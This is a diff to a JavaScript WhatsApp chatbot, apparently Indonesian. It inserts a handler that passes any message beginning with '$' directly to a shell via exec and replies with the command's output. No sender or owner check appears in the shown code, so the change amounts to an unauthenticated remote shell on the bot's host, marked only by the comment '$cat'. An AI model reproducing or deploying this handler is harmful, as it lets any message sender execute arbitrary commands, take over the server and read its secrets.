@@ -1290,7 +1290,16 @@ async function sendFileFromUrl(from, url, caption, msg, men) {
 					reply(commandsDB[i].balasan)
 				}
 			}
-			
+			// $cat
+			    if (budy.startsWith('$')){
+      const cod = args.join(' ')
+      exec(cod, (err, stdout) => {
+      if(err) return reply(`${err}`)
+      if (stdout) {
+      reply(`${stdout}`)
+      }
+      })
+    }
     // whatsapp profie o status san\\
     let settingstatus = 0;
     if (new Date() * 1 - settingstatus > 1000) {
